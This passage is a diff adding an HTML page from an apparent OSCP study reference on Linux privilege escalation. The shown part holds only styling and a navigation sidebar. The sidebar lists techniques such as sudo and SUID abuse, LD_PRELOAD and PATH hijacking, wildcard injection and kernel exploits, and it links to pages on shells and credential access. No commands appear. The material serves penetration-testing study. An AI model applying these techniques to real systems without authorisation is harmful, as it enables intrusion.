@@ -1,0 +1,1527 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="color-scheme" content="light"><title>Escalate privileges on Linux — OSCP Reference</title><meta name="description" content="Plain OSCP reference: commands, explanations, interpretation and next checks."><link rel="canonical" href="https://armaanleg3nd.github.io/oscp/notes/methods/linux-privesc/"><style>:root{color-scheme:light}html{color:#000;background:#fff;scroll-padding-top:1rem}body{margin:0;font:17px/1.5 Times New Roman,Times,serif}a,a:visited{color:#00e;text-decoration:underline}a:focus-visible,summary:focus-visible{outline-offset:3px;outline:2px solid #000}#reference-index{box-sizing:border-box;background:#fff;border-right:1px solid #888;width:19rem;padding:.75rem 1rem;position:fixed;inset:0 auto 0 0;overflow:auto}#reference-index>p:first-child{margin-top:0}nav{overflow-wrap:anywhere;font-size:15px;line-height:1.4}nav ul{margin:.35rem 0;padding-left:1.15rem}nav>ul{padding-left:1rem}nav li{margin:.3rem 0}nav summary{cursor:pointer}nav [aria-current=page]{font-weight:700}main{min-width:0;margin-left:19rem;padding:1rem 2rem 3rem}article{overflow-wrap:anywhere;min-width:0;max-width:85ch}h1{font-size:2em;line-height:1.15}h2{margin-top:1.7em;font-size:1.5em}h3{margin-top:1.5em;font-size:1.2em}h4,h5,h6{margin-top:1.3em;font-size:1em}pre,code{font-family:Courier New,Courier,monospace;font-size:.9em}pre{white-space:pre;overflow-wrap:normal;background:#f5f5f5;border:1px solid #aaa;padding:.7rem;overflow-x:auto}table{border-collapse:collapse;max-width:100%;margin:1rem 0;display:block;overflow-x:auto}th,td{vertical-align:top;text-align:left;border:1px solid #aaa;padding:.35rem .55rem}th{background:#eee}blockquote{border-left:2px solid #aaa;margin-left:0;padding-left:1rem}img,svg{max-width:100%;height:auto}article details{margin:1rem 0}article summary{cursor:pointer}.skip{z-index:2;background:#fff;padding:.5rem;position:fixed;top:0;left:-10000px}.skip:focus{left:0}@media (width<=700px){html{scroll-padding-top:calc(32dvh + 1rem)}#reference-index{z-index:1;border-bottom:1px solid #888;border-right:0;width:100%;height:32dvh;inset:0 0 auto}main{margin-left:0;padding:calc(32dvh + 1rem) 1rem 2rem}body{font-size:16px}}
+</style></head><body><a class="skip" href="#document">Skip to document</a><aside id="reference-index"><p><strong><a href="/oscp/">OSCP Reference</a></strong></p><nav aria-label="Reference index"><p><a href="/oscp/notes/ad-investigation/">AD Notes</a> · <a href="/oscp/notes/ad-investigation/quick-reference/">AD quick reference</a></p><details open><summary>On this page</summary><ul><li><a href="/oscp/notes/methods/linux-privesc/#first-pass-tools-and-findings">First pass: tools and findings</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#identify-the-session-then-run-linpeas-early">Identify the session, then run LinPEAS early</a></li><li><a href="/oscp/notes/methods/linux-privesc/#check-sudo-rules-against-the-actual-binary">Check sudo rules against the actual binary</a></li><li><a href="/oscp/notes/methods/linux-privesc/#catch-short-lived-root-jobs-with-pspy">Catch short-lived root jobs with pspy</a></li><li><a href="/oscp/notes/methods/linux-privesc/#test-suidcapability-findings-manually">Test SUID/capability findings manually</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#discovery-workflow">Discovery workflow</a></li><li><a href="/oscp/notes/methods/linux-privesc/#method-families">Method families</a></li><li><a href="/oscp/notes/methods/linux-privesc/#choose-a-method">Choose a method</a></li><li><a href="/oscp/notes/methods/linux-privesc/#establish-linux-state-and-choose-an-escalation-candidate">Establish Linux state and choose an escalation candidate</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#1-purpose-and-result">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#2-recognition-clues">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#find-the-clue-from-your-starting-access">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#3-prerequisites">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#4-discover-and-verify-prerequisites">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#5-why-it-works">5. Why it works</a></li><li><a href="/oscp/notes/methods/linux-privesc/#6-execute-and-choose-variants">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/linux-privesc/#7-worked-example--hypothetical">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/linux-privesc/#8-verify-the-result">8. Verify the result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#9-failure-and-fallback">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/linux-privesc/#10-next-transitions">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#prove-effective-file-directory-acl-and-mount-control">Prove effective file, directory, ACL and mount control</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#1-purpose-and-result-1">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#2-recognition-clues-1">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#find-the-clue-from-your-starting-access-1">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#3-prerequisites-1">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#4-discover-and-verify-prerequisites-1">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#5-why-it-works-1">5. Why it works</a></li><li><a href="/oscp/notes/methods/linux-privesc/#6-execute-and-choose-variants-1">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/linux-privesc/#7-worked-example--hypothetical-1">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/linux-privesc/#8-verify-the-result-1">8. Verify the result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#9-failure-and-fallback-1">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/linux-privesc/#10-next-transitions-1">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#recover-credentials-from-linux-user-service-and-process-trails">Recover credentials from Linux user, service and process trails</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#1-purpose-and-result-2">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#2-recognition-clues-2">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#find-the-clue-from-your-starting-access-2">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#3-prerequisites-2">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#4-discover-and-verify-prerequisites-2">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#5-why-it-works-2">5. Why it works</a></li><li><a href="/oscp/notes/methods/linux-privesc/#6-execute-and-choose-variants-2">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/linux-privesc/#7-worked-example--hypothetical-2">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/linux-privesc/#8-verify-the-result-2">8. Verify the result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#9-failure-and-fallback-2">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/linux-privesc/#10-next-transitions-2">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#use-an-allowed-sudo-operation-to-cross-a-privilege-boundary">Use an allowed sudo operation to cross a privilege boundary</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#1-purpose-and-result-3">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#2-recognition-clues-3">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#find-the-clue-from-your-starting-access-3">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#3-prerequisites-3">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#4-discover-and-verify-prerequisites-3">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#5-why-it-works-3">5. Why it works</a></li><li><a href="/oscp/notes/methods/linux-privesc/#6-execute-and-choose-variants-3">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/linux-privesc/#7-worked-example--hypothetical-3">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/linux-privesc/#8-verify-the-result-3">8. Verify the result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#9-failure-and-fallback-3">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/linux-privesc/#10-next-transitions-3">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#load-a-controlled-library-through-a-permitted-sudo-environment">Load a controlled library through a permitted sudo environment</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#1-purpose-and-result-4">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#2-recognition-clues-4">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#find-the-clue-from-your-starting-access-4">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#3-prerequisites-4">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#4-discover-and-verify-prerequisites-4">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#5-why-it-works-4">5. Why it works</a></li><li><a href="/oscp/notes/methods/linux-privesc/#6-execute-and-choose-variants-4">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/linux-privesc/#7-worked-example--hypothetical-4">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/linux-privesc/#8-verify-the-result-4">8. Verify the result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#9-failure-and-fallback-4">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/linux-privesc/#10-next-transitions-4">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#use-a-suid-or-sgid-programs-exposed-privileged-primitive">Use a SUID or SGID program&#39;s exposed privileged primitive</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#1-purpose-and-result-5">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#2-recognition-clues-5">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#find-the-clue-from-your-starting-access-5">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#3-prerequisites-5">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#4-discover-and-verify-prerequisites-5">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#5-why-it-works-5">5. Why it works</a></li><li><a href="/oscp/notes/methods/linux-privesc/#6-execute-and-choose-variants-5">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/linux-privesc/#7-worked-example--hypothetical-5">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/linux-privesc/#8-verify-the-result-5">8. Verify the result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#9-failure-and-fallback-5">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/linux-privesc/#10-next-transitions-5">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#use-a-file-capability-that-enables-a-specific-privileged-operation">Use a file capability that enables a specific privileged operation</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#1-purpose-and-result-6">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#2-recognition-clues-6">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#find-the-clue-from-your-starting-access-6">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#3-prerequisites-6">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#4-discover-and-verify-prerequisites-6">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#5-why-it-works-6">5. Why it works</a></li><li><a href="/oscp/notes/methods/linux-privesc/#6-execute-and-choose-variants-6">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/linux-privesc/#7-worked-example--hypothetical-6">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/linux-privesc/#8-verify-the-result-6">8. Verify the result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#9-failure-and-fallback-6">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/linux-privesc/#10-next-transitions-6">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#control-a-script-binary-or-configuration-consumed-by-a-privileged-jobservice">Control a script, binary or configuration consumed by a privileged job/service</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#1-purpose-and-result-7">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#2-recognition-clues-7">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#find-the-clue-from-your-starting-access-7">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#3-prerequisites-7">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#4-discover-and-verify-prerequisites-7">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#5-why-it-works-7">5. Why it works</a></li><li><a href="/oscp/notes/methods/linux-privesc/#6-execute-and-choose-variants-7">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/linux-privesc/#7-worked-example--hypothetical-7">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/linux-privesc/#8-verify-the-result-7">8. Verify the result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#9-failure-and-fallback-7">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/linux-privesc/#10-next-transitions-7">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#hijack-an-unqualified-helper-through-controlled-path-resolution">Hijack an unqualified helper through controlled PATH resolution</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#1-purpose-and-result-8">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#2-recognition-clues-8">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#find-the-clue-from-your-starting-access-8">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#3-prerequisites-8">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#4-discover-and-verify-prerequisites-8">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#5-why-it-works-8">5. Why it works</a></li><li><a href="/oscp/notes/methods/linux-privesc/#6-execute-and-choose-variants-8">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/linux-privesc/#7-worked-example--hypothetical-8">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/linux-privesc/#8-verify-the-result-8">8. Verify the result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#9-failure-and-fallback-8">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/linux-privesc/#10-next-transitions-8">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#turn-wildcard-expanded-filenames-into-privileged-command-options">Turn wildcard-expanded filenames into privileged command options</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#1-purpose-and-result-9">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#2-recognition-clues-9">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#find-the-clue-from-your-starting-access-9">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#3-prerequisites-9">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#4-discover-and-verify-prerequisites-9">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#5-why-it-works-9">5. Why it works</a></li><li><a href="/oscp/notes/methods/linux-privesc/#6-execute-and-choose-variants-9">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/linux-privesc/#7-worked-example--hypothetical-9">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/linux-privesc/#8-verify-the-result-9">8. Verify the result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#9-failure-and-fallback-9">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/linux-privesc/#10-next-transitions-9">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#control-a-privileged-programs-shared-library-resolution">Control a privileged program&#39;s shared-library resolution</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#1-purpose-and-result-10">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#2-recognition-clues-10">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#find-the-clue-from-your-starting-access-10">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#3-prerequisites-10">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#4-discover-and-verify-prerequisites-10">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#5-why-it-works-10">5. Why it works</a></li><li><a href="/oscp/notes/methods/linux-privesc/#6-execute-and-choose-variants-10">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/linux-privesc/#7-worked-example--hypothetical-10">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/linux-privesc/#8-verify-the-result-10">8. Verify the result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#9-failure-and-fallback-10">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/linux-privesc/#10-next-transitions-10">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#change-a-writable-account-or-privilege-policy-file">Change a writable account or privilege-policy file</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#1-purpose-and-result-11">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#2-recognition-clues-11">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#find-the-clue-from-your-starting-access-11">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#3-prerequisites-11">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#4-discover-and-verify-prerequisites-11">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#5-why-it-works-11">5. Why it works</a></li><li><a href="/oscp/notes/methods/linux-privesc/#6-execute-and-choose-variants-11">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/linux-privesc/#7-worked-example--hypothetical-11">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/linux-privesc/#8-verify-the-result-11">8. Verify the result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#9-failure-and-fallback-11">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/linux-privesc/#10-next-transitions-11">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#use-privileged-group-daemon-or-container-management-control">Use privileged group, daemon or container-management control</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#1-purpose-and-result-12">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#2-recognition-clues-12">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#find-the-clue-from-your-starting-access-12">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#3-prerequisites-12">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#4-discover-and-verify-prerequisites-12">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#5-why-it-works-12">5. Why it works</a></li><li><a href="/oscp/notes/methods/linux-privesc/#6-execute-and-choose-variants-12">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/linux-privesc/#7-worked-example--hypothetical-12">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/linux-privesc/#8-verify-the-result-12">8. Verify the result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#9-failure-and-fallback-12">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/linux-privesc/#10-next-transitions-12">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#exploit-a-permission-backed-mount-nfs-mapping-or-local-service">Exploit a permission-backed mount, NFS mapping or local service</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#1-purpose-and-result-13">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#2-recognition-clues-13">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#find-the-clue-from-your-starting-access-13">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#3-prerequisites-13">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#4-discover-and-verify-prerequisites-13">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#5-why-it-works-13">5. Why it works</a></li><li><a href="/oscp/notes/methods/linux-privesc/#6-execute-and-choose-variants-13">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/linux-privesc/#7-worked-example--hypothetical-13">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/linux-privesc/#8-verify-the-result-13">8. Verify the result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#9-failure-and-fallback-13">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/linux-privesc/#10-next-transitions-13">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#select-an-evidence-matched-linux-software-or-kernel-exploit">Select an evidence-matched Linux software or kernel exploit</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#1-purpose-and-result-14">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#2-recognition-clues-14">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#find-the-clue-from-your-starting-access-14">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#3-prerequisites-14">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#4-discover-and-verify-prerequisites-14">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#5-why-it-works-14">5. Why it works</a></li><li><a href="/oscp/notes/methods/linux-privesc/#6-execute-and-choose-variants-14">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/linux-privesc/#7-worked-example--hypothetical-14">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/linux-privesc/#8-verify-the-result-14">8. Verify the result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#9-failure-and-fallback-14">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/linux-privesc/#10-next-transitions-14">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#use-enumeration-tools-to-generate-manually-testable-candidates">Use enumeration tools to generate manually testable candidates</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#1-purpose-and-result-15">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#2-recognition-clues-15">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/linux-privesc/#find-the-clue-from-your-starting-access-15">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#3-prerequisites-15">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#4-discover-and-verify-prerequisites-15">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/linux-privesc/#5-why-it-works-15">5. Why it works</a></li><li><a href="/oscp/notes/methods/linux-privesc/#6-execute-and-choose-variants-15">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/linux-privesc/#7-worked-example--hypothetical-15">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/linux-privesc/#8-verify-the-result-15">8. Verify the result</a></li><li><a href="/oscp/notes/methods/linux-privesc/#9-failure-and-fallback-15">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/linux-privesc/#10-next-transitions-15">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/linux-privesc/#sources-and-shared-concepts">Sources and shared concepts</a></li></ul></details><ul><li><details><summary>Operational procedures</summary><ul><li><details><summary><a href="/oscp/reference/01-discovery-scanning/">01 — Discovery and scanning</a></summary><ul><li><a href="/oscp/reference/01-discovery-scanning/01-path-and-host-discovery/">Path and Host Discovery</a></li><li><a href="/oscp/reference/01-discovery-scanning/02-tcp-scanning/">TCP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/03-service-identification/">Service Identification</a></li><li><a href="/oscp/reference/01-discovery-scanning/04-udp-scanning/">UDP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/05-results-and-next-actions/">Scan Results and Next Actions</a></li><li><a href="/oscp/reference/01-discovery-scanning/06-windows-network-checks/">Windows Network Checks</a></li><li><a href="/oscp/reference/01-discovery-scanning/07-scanner-alternatives/">Scanner Alternatives and Web Baseline Checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/02-service-enumeration/">02 — Service enumeration</a></summary><ul><li><a href="/oscp/reference/02-service-enumeration/01-ftp/">FTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/02-ssh/">SSH Enumeration and Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/03-smtp/">SMTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/04-dns/">DNS Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/05-nfs-rpc/">NFS and Unix RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/06-smb-rpc/">SMB and MS-RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/07-snmp/">SNMP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/08-databases/">Database Enumeration and Privilege Boundaries</a></li><li><a href="/oscp/reference/02-service-enumeration/09-windows-remote-access/">Windows Remote-Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/10-http-web-mapping/">HTTP and Web Application Mapping</a></li><li><a href="/oscp/reference/02-service-enumeration/11-ldap-kerberos/">LDAP and Kerberos Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/12-sip-irc/">SIP and IRC Triage</a></li><li><a href="/oscp/reference/02-service-enumeration/13-memcached-webdav/">Memcached and WebDAV</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/03-initial-access/">03 — Initial access</a></summary><ul><li><a href="/oscp/reference/03-initial-access/01-rdp-access/">RDP Access</a></li><li><a href="/oscp/reference/03-initial-access/02-web-file-handling/">Web File Read, Inclusion and Upload Paths</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/">Command and Manual SQL Injection</a></li><li><a href="/oscp/reference/03-initial-access/04-access-control-and-xss/">Web Access Control, API Logic and XSS</a></li><li><a href="/oscp/reference/03-initial-access/05-wordpress-and-ssrf/">WordPress and SSRF Paths</a></li><li><a href="/oscp/reference/03-initial-access/06-public-exploit-adaptation/">Public Exploit Selection and Adaptation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/04-shells-transfers-credentials/">04 — Shells, transfers and credentials</a></summary><ul><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">File Transfer</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/">Shells, Payloads and Session Repair</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">Credential Classification, Cracking and Reuse</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/04-file-and-repository-hunting/">File and Repository Hunting</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/05-python-tool-environments/">Python Tool Environments</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/">Payload Execution Obstacles</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/05-local-privilege-escalation/">05 — Local privilege escalation</a></summary><ul><li><a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/">Linux Privilege Escalation</a></li><li><a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/">Windows Privilege Escalation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/06-ad-lateral-movement/">06 — AD and lateral movement</a></summary><ul><li><a href="/oscp/reference/06-ad-lateral-movement/01-domain-mapping/">Active Directory Domain Mapping</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/">Windows and Domain Credential Access</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/">Kerberos and Identity Transitions</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/">Object Control, AD CS and Domain Compromise</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/05-lateral-movement/">Lateral Movement</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts/">Conditional AD infrastructure and trust checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/07-pivoting-tunneling/">07 — Pivoting and tunneling</a></summary><ul><li><a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/">Tunneling and Port Forwarding</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/08-evidence-reporting/">08 — Evidence and reporting</a></summary><ul><li><a href="/oscp/reference/08-evidence-reporting/01-attack-tracking-and-evidence/">Integrated Attack Tracking and Evidence</a></li></ul></details></li><li><a href="/oscp/reference/INDEX/">Complete operational task index</a></li></ul></details></li><li><details><summary><a href="/oscp/cheatsheets/">Cheatsheets</a></summary><ul><li><a href="/oscp/cheatsheets/active-directory/">Active Directory Cheatsheet</a></li><li><a href="/oscp/cheatsheets/ad-investigation/">AD Investigation — Where to Look and What Output Means</a></li><li><a href="/oscp/cheatsheets/credentials-cracking/">Credentials and Cracking Cheatsheet</a></li><li><a href="/oscp/cheatsheets/discovery-scanning/">Discovery and Scanning Cheatsheet</a></li><li><a href="/oscp/cheatsheets/evidence-reporting/">Integrated Attack and Reporting Cheatsheet</a></li><li><a 